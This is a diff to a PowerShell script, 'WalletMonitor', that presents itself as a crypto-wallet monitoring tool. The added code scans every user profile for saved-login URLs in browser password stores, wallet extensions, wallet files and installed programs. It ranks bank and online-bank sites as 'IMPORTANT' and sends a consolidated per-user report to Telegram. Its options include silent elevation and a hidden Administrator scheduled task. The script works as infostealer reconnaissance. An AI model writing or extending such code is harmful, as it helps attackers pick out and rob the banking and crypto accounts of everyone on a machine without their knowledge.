@@ -1,6 +1,6 @@
 #Requires -Version 5.1
 <#
-    WalletMonitor.ps1  ::  v3.1  (Single File | no Python)
+    WalletMonitor.ps1  ::  v3.2  (Single File | no Python)
     ==================================================================
     Crypto wallet artifact monitoring tool for your machine (Windows) + Telegram notifications.
 
@@ -602,6 +602,8 @@ $Script:HistoryStats = @()
 $Script:HistoryBrowsers = 0
 $Script:CardStats = @()
 $Script:LoginStats = @()
+$Script:ConsolidatedLoginStats = @()
+$Script:ConsolidatedWalletApps = @()
 
 # =====================================================================
 #  4)  General helper functions
@@ -1824,9 +1826,9 @@ function Get-CategoryMeta {
 }
 
 function Get-LoginCategory {
-    <# Classifies a saved-login site: banks/payments first (config list, then the
-       verified online-bank domain list, then distinctive FDIC institution name
-       tokens), then dApps, then crypto exchanges and wallets (config lists + the
+    <# Classifies a saved-login site: banks/payments first (config list, then distinctive
+       FDIC institution name tokens), then verified online banks (their own category,
+       marked IMPORTANT in the report), then dApps, crypto exchanges and wallets.
        verified crypto-platform lists; exchanges are checked before wallets so
        multi-product platforms such as coinbase.com classify as exchanges), then
        other crypto platforms, shopping/retail, and crypto keywords; host-name
@@ -1837,7 +1839,7 @@ function Get-LoginCategory {
 
     if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'bank_domains' @())) { return 'bank' }
     $vl = Get-VerifiedLists
-    if (Test-DomainMatch -HostName $host_ -Domains $vl.BankDomains) { return 'bank' }
+    if (Test-DomainMatch -HostName $host_ -Domains $vl.BankDomains) { return 'onlinebank' }
     if (Test-HostTokenMatch -HostName $host_ -Tokens $vl.FdicTokens) { return 'bank' }
 
     if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'dapp_domains' @())) { return 'dapp' }
@@ -1859,18 +1861,19 @@ function Get-LoginCategory {
 }
 
 function Get-LoginCategoryMeta {
-    <# Display metadata (icon + title) for the saved-login categories - banks first
-       (they are flagged IMPORTANT in the report), then wallets, exchanges,
-       shopping, dApps, crypto and other. #>
+    <# Display metadata (icon + title) for the saved-login categories - banks and
+       verified online banks first (both are flagged IMPORTANT in the report), then
+       wallets, exchanges, shopping, dApps, crypto and other. #>
     param([string]$Category)
     switch ($Category) {
-        'bank'     { return @{ Order = 1; Icon = '🏨'; Title = 'Banks & payments' } }
-        'wallet'   { return @{ Order = 2; Icon = '🟣'; Title = 'Crypto wallets' } }
-        'exchange' { return @{ Order = 3; Icon = '🟠'; Title = 'Exchanges' } }
-        'shopping' { return @{ Order = 4; Icon = '🛍️'; Title = 'Shopping & retail' } }
-        'dapp'     { return @{ Order = 5; Icon = '🔵'; Title = 'DApps' } }
-        'crypto'   { return @{ Order = 6; Icon = '🟡'; Title = 'Crypto sites' } }
-        default    { return @{ Order = 7; Icon = '⚪'; Title = 'Other' } }
+        'bank'       { return @{ Order = 1; Icon = '🏨'; Title = 'Banks & payments' } }
+        'onlinebank' { return @{ Order = 2; Icon = '🏦'; Title = 'Online banks' } }
+        'wallet'     { return @{ Order = 3; Icon = '🟣'; Title = 'Crypto wallets' } }
+        'exchange'   { return @{ Order = 4; Icon = '🟠'; Title = 'Exchanges' } }
+        'shopping'   { return @{ Order = 5; Icon = '🛍️'; Title = 'Shopping & retail' } }
+        'dapp'       { return @{ Order = 6; Icon = '🔵'; Title = 'DApps' } }
+        'crypto'     { return @{ Order = 7; Icon = '🟡'; Title = 'Crypto sites' } }
+        default      { return @{ Order = 8; Icon = '⚪'; Title = 'Other' } }
     }
 }
 
@@ -2407,8 +2410,8 @@ function Get-LoginSignature {
 
 function Build-LoginReportLines {
     <# Report of the sites kept in the browsers' password stores, grouped and sorted by
-       category: banks/payments first, then crypto wallets, exchanges, dApps, crypto
-       sites, other. URLs only - no credentials. #>
+       category: banks/payments first, then verified online banks, crypto wallets,
+       exchanges, dApps, crypto sites, other. URLs only - no credentials. #>
     param([switch]$Full)
     $lines   = New-Object System.Collections.ArrayList
     $agg     = @(Get-LoginAggregate)
@@ -2442,7 +2445,8 @@ function Build-LoginReportLines {
         if (-not $sites.ContainsKey($key)) {
             $cat = Get-LoginCategory -Url $u
             $vbk = $false
-            if ($cat -eq 'bank') { $vbk = Test-VerifiedBankHost -HostName $key }
+            if ($cat -eq 'onlinebank') { $vbk = $true }
+            elseif ($cat -eq 'bank') { $vbk = Test-VerifiedBankHost -HostName $key }
             $sites[$key] = [PSCustomObject]@{
                 Host     = $key
                 Urls     = (New-Object System.Collections.ArrayList)
@@ -2465,17 +2469,17 @@ function Build-LoginReportLines {
     }
 
     $siteList = @($sites.Values)
-    $catOrder = @('bank', 'wallet', 'exchange', 'shopping', 'dapp', 'crypto', 'other')
-    $catNames = @{ bank = 'banks'; wallet = 'wallets'; exchange = 'exchanges'; shopping = 'shopping'; dapp = 'dApps'; crypto = 'crypto'; other = 'other' }
+    $catOrder = @('bank', 'onlinebank', 'wallet', 'exchange', 'shopping', 'dapp', 'crypto', 'other')
+    $catNames = @{ bank = 'banks'; onlinebank = 'online banks'; wallet = 'wallets'; exchange = 'exchanges'; shopping = 'shopping'; dapp = 'dApps'; crypto = 'crypto'; other = 'other' }
 
     $catSummary = New-Object System.Collections.ArrayList
     foreach ($c in $catOrder) {
         $inCat = @($siteList | Where-Object { $_.Category -eq $c })
         if ($inCat.Count -eq 0) { continue }
-        if ($c -eq 'bank') {
+        if ($c -eq 'bank' -or $c -eq 'onlinebank') {
             $vb = @($inCat | Where-Object { $_.Verified }).Count
-            if ($vb -gt 0) { [void]$catSummary.Add(("banks: <b>{0}</b> (⭐ {1} verified)" -f $inCat.Count, $vb)) }
-            else { [void]$catSummary.Add(("banks: <b>{0}</b>" -f $inCat.Count)) }
+            if ($vb -gt 0) { [void]$catSummary.Add(("$($catNames[$c]): <b>{0}</b> (⭐ {1} verified)" -f $inCat.Count, $vb)) }
+            else { [void]$catSummary.Add(("$($catNames[$c]): <b>{0}</b>" -f $inCat.Count)) }
         } else {
             [void]$catSummary.Add(("{0}: <b>{1}</b>" -f $catNames[$c], $inCat.Count))
         }
@@ -2502,14 +2506,14 @@ function Build-LoginReportLines {
         [void]$lines.Add('')
         [void]$lines.Add('━━━━━━━━━━━━━━')
         $imp = ''
-        if ($c -eq 'bank') { $imp = ' ⭐ <b>IMPORTANT</b>' }
+        if ($c -eq 'bank' -or $c -eq 'onlinebank') { $imp = ' ⭐ <b>IMPORTANT</b>' }
         [void]$lines.Add("$($meta.Icon) <b>$($meta.Title)</b>$imp - $($inCat.Count) site(s)")
         foreach ($site in $inCat) {
             if ($shown -ge $maxUrls) { $truncated = $true; break }
             $cnt = 0
             if ($siteCnts.ContainsKey($site.Host)) { $cnt = [int]$siteCnts[$site.Host] }
             $ver = ''
-            if ($c -eq 'bank' -and $site.Verified) { $ver = ' ✔ <i>verified bank</i>' }
+            if (($c -eq 'bank' -or $c -eq 'onlinebank') -and $site.Verified) { $ver = ' ✔ <i>verified bank</i>' }
             [void]$lines.Add("   • $(ConvertTo-HtmlSafe $site.Host) — <b>$cnt</b> login(s)$ver")
             $n = 0
             foreach ($su in @($site.Urls)) {
@@ -2562,6 +2566,269 @@ function Send-LoginReport {
     else { Write-Log 'Failed to send part of the login report.' 'ERROR' }
 }
 
+
+# =====================================================================
+#  12c)  Consolidated cross-profile saved-login + wallet-app report
+# =====================================================================
+
+function New-ConsolidatedLoginStat {
+    param([string]$User, [string]$Browser, [string]$Profile, [int]$Logins, [string]$Source, [string[]]$Urls)
+    return [PSCustomObject]@{
+        User    = $User
+        Browser = $Browser
+        Profile = $Profile
+        Logins  = $Logins
+        Source  = $Source
+        Urls    = @($Urls)
+    }
+}
+
+function Add-DeviceWalletFindings {
+    <# Records the findings added to $Script:FoundItems since $FromIndex (desktop /
+       extension / file types) as device wallet-artifact entries, tagged with the
+       user (or 'machine') they belong to. #>
+    param([int]$FromIndex, [string]$User)
+    $count = @($Script:FoundItems).Count
+    for ($i = $FromIndex; $i -lt $count; $i++) {
+        $f = $Script:FoundItems[$i]
+        if (@('desktop', 'extension', 'file') -notcontains $f.Type) { continue }
+        [void]$Script:ConsolidatedWalletApps.Add([PSCustomObject]@{
+            Type  = [string]$f.Type
+            Label = [string]$f.Label
+            User  = $User
+        })
+    }
+}
+
+function Build-ConsolidatedReportLines {
+    <# Builds ONE professional report across all scanned user profiles:
+       header + summary, then the site sections in priority order - banks
+       (IMPORTANT), online banks (IMPORTANT), crypto wallets, exchanges,
+       dApps, shopping, crypto sites, other - and finally the crypto wallet
+       applications found on the device. Every site line lists the users
+       that saved it. URLs only - no credentials. #>
+    $lines   = New-Object System.Collections.ArrayList
+    $stats   = @($Script:ConsolidatedLoginStats)
+    $ts      = (Get-Date).ToString('yyyy-MM-dd HH:mm')
+    $maxUrls = [int](Get-Prop (Get-Prop $Script:Cfg 'saved_logins') 'max_urls' 120)
+
+    $total = 0
+    foreach ($s in $stats) { $total += [int]$s.Logins }
+
+    $userList = @($Script:ConsolidatedUsers | Sort-Object)
+    if ($userList.Count -eq 0) { $userList = @([System.Environment]::UserName) }
+
+    [void]$lines.Add('🔑 <b>Saved logins & wallet apps - consolidated report</b>')
+    [void]$lines.Add('━━━━━━━━━━━━━━')
+    [void]$lines.Add("🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>")
+    [void]$lines.Add("👤 Users scanned: <b>$(ConvertTo-HtmlSafe ($userList -join ', '))</b> ($($userList.Count) profile(s))")
+    [void]$lines.Add("🕒 Report time: $ts")
+    [void]$lines.Add('🔒 <i>URLs only - no username and no password is read, decrypted, stored or sent.</i>')
+
+    # Group the unique URLs per site (host with a leading "www." stripped), count the
+    # stored logins per site and remember which users have the site saved.
+    $sites = @{}
+    foreach ($s in $stats) {
+        foreach ($u in @($s.Urls)) {
+            $t = ([string]$u).Trim()
+            if ([string]::IsNullOrWhiteSpace($t)) { continue }
+            $h = Get-UrlHost $t
+            if ([string]::IsNullOrWhiteSpace($h)) { $h = $t }
+            $key = $h
+            if ($key.StartsWith('www.')) { $key = $key.Substring(4) }
+            if (-not $sites.ContainsKey($key)) {
+                $cat = Get-LoginCategory -Url $t
+                $vbk = $false
+                if ($cat -eq 'onlinebank') { $vbk = $true }
+                elseif ($cat -eq 'bank') { $vbk = Test-VerifiedBankHost -HostName $key }
+                $sites[$key] = [PSCustomObject]@{
+                    Host     = $key
+                    Urls     = (New-Object System.Collections.ArrayList)
+                    Users    = (New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::OrdinalIgnoreCase))
+                    Category = $cat
+                    Verified = $vbk
+                    LoginCnt = 0
+                }
+            }
+            if (-not $sites[$key].Urls.Contains($t)) { [void]$sites[$key].Urls.Add($t) }
+            $sites[$key].LoginCnt = [int]$sites[$key].LoginCnt + 1
+            [void]$sites[$key].Users.Add([string]$s.User)
+        }
+    }
+
+    $siteList = @($sites.Values)
+    $catOrder = @('bank', 'onlinebank', 'wallet', 'exchange', 'shopping', 'dapp', 'crypto', 'other')
+    $catNames = @{ bank = 'banks'; onlinebank = 'online banks'; wallet = 'wallets'; exchange = 'exchanges'; shopping = 'shopping'; dapp = 'dApps'; crypto = 'crypto'; other = 'other' }
+
+    if ($total -eq 0 -and $siteList.Count -eq 0) {
+        [void]$lines.Add('')
+        [void]$lines.Add('ℹ️ No saved logins found in any supported browser.')
+    } else {
+        $catSummary = New-Object System.Collections.ArrayList
+        foreach ($c in $catOrder) {
+            $inCat = @($siteList | Where-Object { $_.Category -eq $c })
+            if ($inCat.Count -eq 0) { continue }
+            if ($c -eq 'bank' -or $c -eq 'onlinebank') {
+                $vb = @($inCat | Where-Object { $_.Verified }).Count
+                if ($vb -gt 0) { [void]$catSummary.Add(("$($catNames[$c]): <b>{0}</b> (⭐ {1} verified)" -f $inCat.Count, $vb)) }
+                else { [void]$catSummary.Add(("$($catNames[$c]): <b>{0}</b>" -f $inCat.Count)) }
+            } else {
+                [void]$catSummary.Add(("{0}: <b>{1}</b>" -f $catNames[$c], $inCat.Count))
+            }
+        }
+
+        [void]$lines.Add('')
+        [void]$lines.Add("📊 Stored logins: <b>$total</b> · unique sites: <b>$($sites.Count)</b> · profiles with logins: <b>$($stats.Count)</b>")
+        if ($catSummary.Count -gt 0) {
+            [void]$lines.Add('')
+            [void]$lines.Add('🗂 Categories: ' + ($catSummary -join ' · '))
+        }
+
+        $shown     = 0
+        $truncated = $false
+        foreach ($c in $catOrder) {
+            $inCat = @($siteList | Where-Object { $_.Category -eq $c } |
+                Sort-Object -Property @{ Expression = { $_.LoginCnt }; Descending = $true }, @{ Expression = { $_.Host } })
+            if ($inCat.Count -eq 0) { continue }
+            $meta = Get-LoginCategoryMeta $c
+            [void]$lines.Add('')
+            [void]$lines.Add('━━━━━━━━━━━━━━')
+            $imp = ''
+            if ($c -eq 'bank' -or $c -eq 'onlinebank') { $imp = ' ⭐ <b>IMPORTANT</b>' }
+            [void]$lines.Add("$($meta.Icon) <b>$($meta.Title)</b>$imp - $($inCat.Count) site(s)")
+            foreach ($site in $inCat) {
+                if ($shown -ge $maxUrls) { $truncated = $true; break }
+                $ver = ''
+                if ($site.Verified) { $ver = ' ✔' }
+                $usr = (@($site.Users) | Sort-Object) -join ', '
+                [void]$lines.Add("   • $(ConvertTo-HtmlSafe $site.Host)$ver — <b>$([int]$site.LoginCnt)</b> login(s) · users: $(ConvertTo-HtmlSafe $usr)")
+                $shown++
+            }
+            if ($truncated) { break }
+        }
+        if ($truncated) {
+            [void]$lines.Add('   … listing truncated (saved_logins.max_urls reached).')
+        }
+    }
+
+    # Crypto wallet applications on the device: installed programs, browser extensions
+    # and wallet files found during this run (machine-wide or per user profile).
+    $apps     = @($Script:ConsolidatedWalletApps)
+    $seenApps = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::Ordinal)
+    $unique   = New-Object System.Collections.ArrayList
+    foreach ($a in @($apps | Sort-Object Type, Label, User)) {
+        $k = "$([string]$a.Type)|$([string]$a.Label)|$([string]$a.User)"
+        if ($seenApps.Contains($k)) { continue }
+        [void]$seenApps.Add($k)
+        [void]$unique.Add($a)
+    }
+    [void]$lines.Add('')
+    [void]$lines.Add('━━━━━━━━━━━━━━')
+    if ($unique.Count -eq 0) {
+        [void]$lines.Add('💼 <b>Crypto wallet apps on device</b>')
+        [void]$lines.Add('   ✅ No crypto wallet applications found (installed programs, browser extensions and wallet files checked).')
+    } else {
+        [void]$lines.Add("💼 <b>Crypto wallet apps on device</b> - $($unique.Count) item(s)")
+        foreach ($a in $unique) {
+            $tn = ''
+            switch ([string]$a.Type) {
+                'desktop'   { $tn = '🖥 installed program' }
+                'extension' { $tn = '🧩 browser extension' }
+                'file'      { $tn = '📁 wallet file' }
+                default     { $tn = [string]$a.Type }
+            }
+            [void]$lines.Add("   • $(ConvertTo-HtmlSafe $tn): $(ConvertTo-HtmlSafe (Limit-Text ([string]$a.Label) 120)) · user: $(ConvertTo-HtmlSafe ([string]$a.User))")
+        }
+    }
+
+    [void]$lines.Add('')
+    [void]$lines.Add('ℹ️ <i>Chromium (Chrome/Edge/Brave/Vivaldi/Opera/Chromium): only the origin_url column of the logins table is read. Firefox: only the hostname keys of logins.json are read. Password values, usernames and encrypted blobs are never read, decrypted or stored.</i>')
+    return @($lines)
+}
+
+function Invoke-ConsolidatedLoginReport {
+    <# Scans every user profile ONCE (saved-login URLs, wallet browser extensions,
+       wallet files) plus the machine-wide installed-programs scan, then sends a
+       SINGLE consolidated Telegram message covering all profiles: banks, online
+       banks, crypto wallets, exchanges, dApps, shopping and any crypto wallet
+       applications found on the device. URLs only - no credentials are ever read.
+       The state file is left untouched, so this report never masks future
+       "new detection" alerts of the normal scan cycle. #>
+    $Script:RunErrors  = New-Object System.Collections.ArrayList
+    $Script:FoundItems = New-Object System.Collections.ArrayList
+    $Script:NewItems   = New-Object System.Collections.ArrayList
+
+    # Report-only run: swap the state collectors for throw-away copies so the scans
+    # below cannot mark anything as "seen" or bump the daily counters.
+    $keepSeen  = $Script:State.seen
+    $keepDaily = $Script:State.daily
+    $keepSet   = $Script:SeenSet
+    $Script:State.seen  = New-Object System.Collections.ArrayList
+    $Script:State.daily = New-Object System.Collections.ArrayList
+    $Script:SeenSet     = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::Ordinal)
+
+    $Script:ConsolidatedLoginStats = New-Object System.Collections.ArrayList
+    $Script:ConsolidatedWalletApps = New-Object System.Collections.ArrayList
+    $Script:ConsolidatedUsers      = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::OrdinalIgnoreCase)
+
+    $scanCfg = Get-Prop $Script:Cfg 'scan' $null
+
+    # Machine-wide: installed programs (registry) - a single run covers all users.
+    if ([bool](Get-Prop $scanCfg 'installed_programs' $true)) {
+        try {
+            $pre = @($Script:FoundItems).Count
+            Invoke-InstalledProgramScan
+            Add-DeviceWalletFindings -FromIndex $pre -User 'machine'
+        } catch {
+            Add-Error "Installed-programs scan failed: $($_.Exception.Message)"
+            Write-Log "Installed-programs scan failed: $($_.Exception.Message)" 'ERROR'
+        }
+    }
+
+    # Per user profile: saved-login URLs, wallet extensions and wallet files.
+    Invoke-ForEachProfile {
+        $uNow = [string]$env:USERNAME
+        if ([string]::IsNullOrWhiteSpace($uNow)) { $uNow = '(current user)' }
+        [void]$Script:ConsolidatedUsers.Add($uNow)
+
+        try {
+            Invoke-BrowserLoginScan
+            foreach ($s in @($Script:LoginStats)) {
+                [void]$Script:ConsolidatedLoginStats.Add((New-ConsolidatedLoginStat -User $uNow -Browser $s.Browser -Profile $s.Profile -Logins $s.Logins -Source $s.Source -Urls @($s.Urls)))
+            }
+        } catch {
+            Add-Error "Login scan failed for '$uNow': $($_.Exception.Message)"
+            Write-Log "Login scan failed for '$uNow': $($_.Exception.Message)" 'ERROR'
+        }
+
+        $pre = @($Script:FoundItems).Count
+        if ([bool](Get-Prop $scanCfg 'browser_extensions' $true)) {
+            try { Invoke-BrowserExtensionScan } catch { Add-Error "Browser-extension scan failed for '$uNow': $($_.Exception.Message)" }
+        }
+        if ([bool](Get-Prop $scanCfg 'filesystem' $true)) {
+            try { Invoke-FileSystemScan } catch { Add-Error "Filesystem scan failed for '$uNow': $($_.Exception.Message)" }
+        }
+        Add-DeviceWalletFindings -FromIndex $pre -User $uNow
+    }
+
+    # Restore the untouched state objects before the report is sent.
+    $Script:State.seen  = $keepSeen
+    $Script:State.daily = $keepDaily
+    $Script:SeenSet     = $keepSet
+
+    $lines    = Build-ConsolidatedReportLines
+    $maxChars = [int](Get-Prop (Get-Prop (Get-Prop $Script:Cfg 'browser_history') 'report') 'max_message_chars' 3500)
+    $chunks   = @(Split-MessageChunks -Lines $lines -MaxChars $maxChars)
+    $total    = $chunks.Count
+    $sentAll  = $true
+    for ($i = 0; $i -lt $total; $i++) {
+        $prefix = ''
+        if ($total -gt 1) { $prefix = "📄 [$($i + 1)/$total]`n" }
+        if (-not (Send-TelegramMessage -Text ($prefix + $chunks[$i]))) { $sentAll = $false }
+    }
+    if ($sentAll) { Write-Log "Consolidated login report sent ($total message(s))." }
+    else { Write-Log 'Failed to send part of the consolidated login report.' 'ERROR' }
+}
 function Invoke-BrowserHistoryScan {
     Write-Log 'Scanning browser history (direct PowerShell reader - all browsers)...'
     $Script:HistoryHits     = @()
@@ -3365,7 +3632,7 @@ $hostLabelCfg = [string](Get-Prop $Script:Cfg 'host_label' '')
 if ($hostLabelCfg) { $Script:HostLabel = $hostLabelCfg }
 
 if ($Help) {
-    Write-Console 'WalletMonitor v3.1 — crypto wallet artifact monitoring (single file, no Python)' 'Cyan'
+    Write-Console 'WalletMonitor v3.2 — crypto wallet artifact monitoring (single file, no Python)' 'Cyan'
     Write-Console ''
     Write-Console '  (no switches)    one silent scan + Telegram notifications'
     Write-Console '  -Console         show output on screen'
@@ -3373,7 +3640,7 @@ if ($Help) {
     Write-Console '  -TestNotify      send a test message to Telegram'
     Write-Console '  -HistoryReport   send the browser history report now'
     Write-Console '  -CardReport      send the saved payment-card report (count-only)'
-    Write-Console '  -LoginReport     send saved-login sites sorted by category (banks/wallets/exchanges/dApps/other; URLs only)'
+    Write-Console '  -LoginReport     send ONE consolidated report for ALL profiles: saved-login sites by category (banks/online banks/wallets/exchanges/dApps/other; URLs only) + crypto wallet apps on the device'
     Write-Console '  -Elevate         relaunch the tool with Administrator rights silently (hidden window)'
     Write-Console '  -Loop            continuous monitoring loop (per schedule.interval_minutes)'
     Write-Console '  -Install         register a scheduled task that runs as Administrator silently (requires Administrator)'
@@ -3439,7 +3706,7 @@ if ($Install) {
 
 Initialize-Log
 Rotate-LogIfNeeded
-Write-Log '################ WalletMonitor v3.1 (single file, no Python) ################'
+Write-Log '################ WalletMonitor v3.2 (single file, no Python) ################'
 
 Initialize-Telegram
 Initialize-State
@@ -3478,11 +3745,8 @@ if ($CardReport) {
 }
 
 if ($LoginReport) {
-    Write-Console 'Running the saved-login site-URL report...'
-    Invoke-ForEachProfile {
-        try { Invoke-BrowserLoginScan } catch { Add-Error "Login scan failed: $($_.Exception.Message)" }
-        [void](Send-LoginReport -Force -Full)
-    }
+    Write-Console 'Running the consolidated saved-login + wallet-app report (one message)...'
+    Invoke-ConsolidatedLoginReport
     Save-State
     exit 0
 }
